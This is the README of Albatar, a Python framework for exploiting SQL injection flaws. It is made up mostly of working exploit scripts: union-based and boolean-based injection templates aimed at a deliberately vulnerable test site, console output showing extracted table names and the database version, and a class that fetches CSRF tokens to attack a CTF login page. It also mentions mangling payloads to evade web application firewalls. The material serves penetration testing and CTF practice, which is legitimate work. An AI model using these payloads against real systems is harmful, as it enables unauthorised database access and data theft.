I wrote Albatar to have a neat and tidy tool to exploit SQL Injection vulnerabilities.

Unlike [sqlmap](http://sqlmap.org/), Albatar will not detect SQL Injection vulnerabilities, it is primarily designed to help exploit not-so-straightforward SQLIs where sqlmap would need tweaking and patching to work.

Albatar is a framework in Python. As a result, you need to write some Python code to be able to exploit the SQLI. Then simply invoke your script by passing sqlmap-like command line options (like --dbs, --banner etc.) to retrieve data from the database.

Currently, Albatar supports MySQL, MSSQL and Oracle with the Union, Error, Boolean and Time techniques.

## Examples

* Simple union-based SQLI (MySQL)

Let's use Albatar to exploit a textbook union-based SQLI at http://testphp.vulnweb.com/artists.php?artist=1. Clone the repository, and create the below script:
```python
from albatar import *
from urllib.parse import quote
import re

PROXIES = {} #'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
HEADERS = ['User-Agent: Mozilla/5.0']

def extract_results(headers, body, time):
  return re.findall(':ABC:(.+?):ABC:', body, re.S)

def mysql_union():

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://testphp.vulnweb.com/artists.php?artist=${injection}',
      method = 'GET',
      response_processor = extract_results,
      encode_payload = quote,
      )

  template = '-1 union all select null,null,concat(0x3a4142433a,X,0x3a4142433a) from ${query}-- '

  return Method_union(make_requester, template)

sqli = MySQL_Inband(mysql_union())

for r in sqli.exploit():
  print(r)
```

Then execute the script to exploit the SQLI:
```
$ python3 testphp-union.py -D acuart --tables
15:41:49 albatar - Starting Albatar v0.1 (https://github.com/lanjelot/albatar) at 2020-04-13 15:41 AEST
15:41:49 albatar - Executing: ('(SELECT COUNT(*) X FROM information_schema.tables WHERE table_schema="acuart")a', '(SELECT table_name X FROM information_schema.tables WHERE table_schema="acuart" LIMIT ${row_pos},${row_count})a')
15:41:50 albatar - count: 8
artists
carts
categ
featured
guestbook
pictures
products
users
15:41:56 albatar - Time: 0h 0m 6s
```

* Simple boolean-based SQLI (MySQL)

Here's how to exploit a boolean-based SQLI at http://testphp.vulnweb.com/listproducts.php?cat=1.
```python
from albatar import *
from urllib.parse import quote

PROXIES = {} #'http': 'http://127.0.0.1:8082', 'https': 'http://127.0.0.1:8082'}
HEADERS = ['User-Agent: Mozilla/5.0']

def test_state_grep(headers, body, time):
  if 'Lorem ipsum dolor sit amet' in body:
    return 1
  else:
    return 0

def mysql_boolean():

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://testphp.vulnweb.com/listproducts.php?cat=${injection}',
      method = 'GET',
      response_processor = test_state_grep,
      encode_payload = quote
      )

  template = '1 and (ascii(substring((${query}),${char_pos},1))&${bit_mask})=${bit_mask}'

  return Method_bitwise(make_requester, template, confirm_char=True)

sqli = MySQL_Blind(mysql_boolean())

for r in sqli.exploit():
  print(r)
```

And execute:
```
$ python3 testphp-boolean.py -b
15:43:18 albatar - Starting Albatar v0.1 (https://github.com/lanjelot/albatar) at 2020-04-13 15:43 AEST
15:43:18 albatar - Executing: 'SELECT VERSION()'
5.1.73-0ubuntu0.10.04.1
15:43:45 albatar - Time: 0h 0m 27s
```

* Encoding / WAF evasion

If you need to encode your payload to meet specific requirements, simply code a function to mangle the payload in every request.
The web task [luhn-300](https://github.com/ctfs/write-ups-2016/tree/master/nullcon-hackim-2016/web/luhn-300) from Hackim CTF 2016 was a good example to showcase this.

* CSRF tokens

If you need to do anything before or after submitting the SQLI payload, simply extend the Requester class. For example, if you need to provide a CSRF token, like with the web task [hackme-400](https://github.com/ctfs/write-ups-2016/tree/master/su-ctf-2016/web/hackme-400) from SU CTF 2016, write something like this:
```python
...
class Requester_CSRF(Requester_HTTP_requests):

  def test(self, payload):
    response = self.session.get('http://ctf.sharif.edu:35455/chal/hackme/8b784460681e5282/login.php')
    token = re.search("name='user_token' value='([^']+)'", response.text).group(1)
    self.http_opts[2] = self.http_opts[2].replace('_CSRF_', token)

    return super(Requester_CSRF, self).test(payload)

def mysql_union():

  def make_requester():
    return Requester_CSRF(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://ctf.sharif.edu:35455/chal/hackme/8b784460681e5282/login.php',
      body = 'username=${injection}&password=asdf&Login=Login&user_token=_CSRF_',
      method = 'POST',
      response_processor = extract_results,
      encode_payload = quote,
      )

  template = "a' union select concat(0x3a4142433a,X,0x3a4142433a),null,null,null from ${query} #"

  return Method_union(make_requester, template, pager=10)
```

You could even write a brand new Requester class to exploit a SQLI that is not in a web application, but in a command line application for example.

* More

Find more examples in [demo.py](demo.py).
